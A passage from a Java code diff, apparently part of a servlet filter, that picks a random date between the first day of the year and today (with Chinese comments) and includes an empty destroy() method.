+        LocalDate today = LocalDate.now(ZoneId.systemDefault());
+
+        // 计算今年第一天到今天之间的总天数
+        int daysBetween = (int) startOfYear.until(today, java.time.temporal.ChronoUnit.DAYS);
+
+        // 生成一个随机的天数偏移量，用于选择今年的一个随机日子
+        int randomDays = random.nextInt(daysBetween + 1); // +1 使得结果包含今天
+
+        // 计算随机日期
+        LocalDate randomDate = startOfYear.plusDays(randomDays);
+
+        return randomDate;
+    }
+
+    @Override
+    public void destroy() {
+        // Add any necessary cleanup code here
+    }
+
+    // Include any other helper classes or methods here, if needed.
+    // For example, CharResponseWrapper if you're modifying the response content.
+}
